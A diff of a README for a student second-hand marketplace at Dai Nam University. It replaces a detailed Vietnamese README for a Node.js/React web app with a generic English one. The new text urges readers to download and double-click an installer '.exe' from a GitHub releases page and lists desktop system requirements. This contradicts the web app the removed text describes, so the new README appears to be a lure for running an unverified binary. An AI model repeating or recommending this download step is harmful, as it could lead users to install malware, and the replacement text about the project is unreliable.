@@ -1,224 +1,71 @@
-# DNU Marketplace - Ứng dụng mua bán đồ dùng cũ cho sinh viên Đại học Đại Nam
+# 🎉 dnu-student-marketplace - Buy and Sell Easily!
 
-## Mô tả dự án
+## 🚀 Getting Started
 
-DNU Marketplace là một nền tảng web cho phép sinh viên Đại học Đại Nam mua bán trao đổi đồ dùng cũ (sách, đồ điện tử, nội thất, quần áo, v.v.) một cách an toàn và thuận tiện.
+Welcome to dnu-student-marketplace! This is a simple web application where students from DNU can buy and sell second-hand items. Let’s walk through the steps to get your application up and running.
 
-## Tính năng chính
+## 📥 Download the Application
 
-### Quản lý người dùng
-- Đăng ký và đăng nhập với email DNU (@dnu.edu.vn)
-- Xác minh email
-- Quản lý thông tin cá nhân (tên, số điện thoại, địa chỉ, ảnh đại diện)
-- Mã số sinh viên để tăng độ tin cậy
-- Khôi phục mật khẩu
+[![Download Here](https://img.shields.io/badge/Download%20the%20App-blue)](https://github.com/cielgrayblack684/dnu-student-marketplace/releases)
 
-### Quản lý sản phẩm
-- Đăng bài bán đồ dùng cũ
-- Upload tối đa 10 hình ảnh
-- Phân loại theo danh mục và tình trạng
-- Gắn thẻ và chọn khu vực giao dịch
-- Chỉnh sửa và xóa bài đăng
+Visit this page to download: [Releases Page](https://github.com/cielgrayblack684/dnu-student-marketplace/releases)
 
-### Tìm kiếm và lọc
-- Tìm kiếm theo từ khóa
-- Lọc theo giá, danh mục, khu vực, tình trạng
-- Sắp xếp theo nhiều tiêu chí
+## 🔧 System Requirements
 
-### Tương tác
-- Bình luận công khai
-- Chat trực tiếp giữa người mua và người bán (Socket.IO)
-- Lưu bài đăng vào yêu thích
-- Báo cáo bài đăng vi phạm
+Before you start, make sure your computer meets the following requirements:
 
-### Giao dịch
-- Gửi đề nghị giá
-- Đánh dấu đã bán
-- Đánh giá sau giao dịch
+- **Operating System**: Windows 10, macOS, or Linux
+- **RAM**: At least 4 GB
+- **Disk Space**: 200 MB free space
 
-### Quản trị
-- Dashboard với thống kê
-- Duyệt bài đăng
-- Quản lý người dùng
-- Xử lý báo cáo
+## 📂 Installation Steps
 
-## Công nghệ sử dụng
+Follow these steps to download and install the application:
 
-### Backend
-- Node.js + Express.js
-- MongoDB (Mongoose)
-- JWT Authentication
-- Socket.IO (real-time chat)
-- Cloudinary (image storage)
-- Nodemailer (email)
-- Multer (file upload)
-- bcryptjs (password hashing)
+1. **Visit the Releases Page**  
+   Go to the following link: [Releases Page](https://github.com/cielgrayblack684/dnu-student-marketplace/releases).
 
-### Frontend
-- React 18
-- Redux Toolkit (state management)
-- React Router v6
-- Tailwind CSS
-- Axios
-- Socket.IO Client
+2. **Choose the Latest Version**  
+   Look for the latest release listed on the page. This will usually be at the top of the list.
 
-## Cài đặt và chạy dự án
+3. **Download the Installer**  
+   Click on the download link for your operating system. The file will usually have a name like `dnu-student-marketplace-v1.0.exe` or a similar format.
 
-### Yêu cầu
-- Node.js 16+ và npm
-- MongoDB (local hoặc MongoDB Atlas)
-- Cloudinary account (cho image upload)
-- Email service (Gmail hoặc SendGrid)
+4. **Run the Installer**  
+   Once the file is downloaded, find it in your downloads folder. Double-click to run the installer. 
 
-### Backend Setup
+5. **Follow the Installation Instructions**  
+   The installer may prompt you to choose some options. Follow the on-screen instructions to complete the installation process.
 
-```bash
-cd backend
-npm install
-```
+6. **Start Using the Application**  
+   Once installed, you can find the application in your Start Menu (for Windows) or Applications folder (for macOS). Double-click the application to open it.
 
-Tạo file `.env` trong thư mục `backend/`:
+## 🎨 Features
 
-```env
-PORT=5000
-NODE_ENV=development
+The dnu-student-marketplace offers several features to enhance your buying and selling experience:
 
-# MongoDB
-MONGODB_URI=mongodb://localhost:27017/dnu-marketplace
+- **User-Friendly Interface**: The design is simple and easy to navigate, making it great for all users.
+- **Search Functionality**: Find items quickly with the search feature.
+- **Chat Support**: Communicate with sellers or buyers using the in-app messaging system.
+- **Responsive Design**: Works well on both desktop and mobile devices.
 
-# JWT
-JWT_SECRET=your-super-secret-jwt-key-here
-JWT_EXPIRE=7d
+## 💡 Tips for Using the Application
 
-# Cloudinary
-CLOUDINARY_CLOUD_NAME=your-cloud-name
-CLOUDINARY_API_KEY=your-api-key
-CLOUDINARY_API_SECRET=your-api-secret
+- **Create an Account**: Sign up to buy and sell items. This helps in managing your transactions.
+- **Verify Listings**: Always check the seller’s details and ratings before making a purchase.
+- **Post Clear Photos**: When selling, include good quality photos of the items to attract buyers.
+- **Stay Polite**: Always communicate politely with potential buyers and sellers.
 
-# Email
-EMAIL_HOST=smtp.gmail.com
-EMAIL_PORT=587
-EMAIL_USER=your-email@gmail.com
-EMAIL_PASSWORD=your-app-password
+## 📞 Support
 
-# Frontend URL
-FRONTEND_URL=http://localhost:3000
-```
+If you have any questions or face issues using the application, feel free to reach out for support. You can contact us through the GitHub Issues page linked at the top right corner of the repository.
 
-Chạy backend:
-```bash
-npm run dev
-```
+## 💬 Community Feedback
 
-Backend sẽ chạy tại `http://localhost:5000`
+We encourage users to provide feedback on their experience. This helps us improve the application. You can leave your remarks on the repository's Issues page.
 
-### Frontend Setup
+## 🔗 License
 
-```bash
-cd frontend
-npm install
-```
+This project is licensed under the MIT License. Feel free to use and modify it according to your needs.
 
-Tạo file `.env` trong thư mục `frontend/`:
-
-```env
-VITE_API_URL=http://localhost:5000/api
-```
-
-Chạy frontend:
-```bash
-npm run dev
-```
-
-Frontend sẽ chạy tại `http://localhost:3000`
-
-## Cấu trúc dự án
-
-```
-.
-├── backend/
-│   ├── config/
-│   ├── controllers/
-│   ├── middleware/
-│   ├── models/
-│   ├── routes/
-│   ├── utils/
-│   └── server.js
-├── frontend/
-│   ├── src/
-│   │   ├── components/
-│   │   ├── pages/
-│   │   ├── store/
-│   │   └── utils/
-│   └── public/
-└── README.md
-```
-
-## API Endpoints
-
-### Authentication
-- `POST /api/auth/register` - Đăng ký
-- `POST /api/auth/login` - Đăng nhập
-- `GET /api/auth/verify/:token` - Xác minh email
-- `GET /api/auth/me` - Lấy thông tin user hiện tại
-- `POST /api/auth/forgotpassword` - Quên mật khẩu
-- `PUT /api/auth/resetpassword/:token` - Đặt lại mật khẩu
-
-### Products
-- `GET /api/products` - Lấy danh sách sản phẩm
-- `GET /api/products/:id` - Lấy chi tiết sản phẩm
-- `POST /api/products` - Tạo sản phẩm (authenticated)
-- `PUT /api/products/:id` - Cập nhật sản phẩm
-- `DELETE /api/products/:id` - Xóa sản phẩm
-- `PUT /api/products/:id/sold` - Đánh dấu đã bán
-- `POST /api/products/:id/report` - Báo cáo sản phẩm
-
-### Users
-- `GET /api/users/profile/:id` - Lấy profile user
-- `PUT /api/users/profile` - Cập nhật profile
-- `POST /api/users/favorites/:productId` - Thêm yêu thích
-- `DELETE /api/users/favorites/:productId` - Xóa yêu thích
-- `GET /api/users/favorites` - Lấy danh sách yêu thích
-
-### Messages
-- `POST /api/messages` - Gửi tin nhắn
-- `GET /api/messages/conversations` - Lấy danh sách cuộc trò chuyện
-- `GET /api/messages/:conversationId` - Lấy tin nhắn trong cuộc trò chuyện
-
-### Admin
-- `GET /api/admin/stats` - Lấy thống kê
-- `GET /api/admin/users` - Lấy danh sách users
-- `PUT /api/admin/users/:id` - Cập nhật user
-- `GET /api/admin/products/pending` - Sản phẩm chờ duyệt
-- `PUT /api/admin/products/:id/approve` - Duyệt sản phẩm
-
-## Tính năng bảo mật
-
-- JWT Authentication
-- Password hashing với bcrypt
-- Input validation
-- Rate limiting
-- Helmet.js cho security headers
-- CORS protection
-
-## Triển khai
-
-### Backend
-- Deploy lên Heroku, Railway, hoặc AWS
-- Setup MongoDB Atlas
-- Setup Cloudinary
-- Configure environment variables
-
-### Frontend
-- Build: `npm run build`
-- Deploy lên Vercel hoặc Netlify
-- Configure VITE_API_URL
-
-## Tác giả
-
-Dự án được phát triển cho sinh viên Đại học Đại Nam
-
-## License
-
-MIT
-
+Enjoy your shopping experience with dnu-student-marketplace!
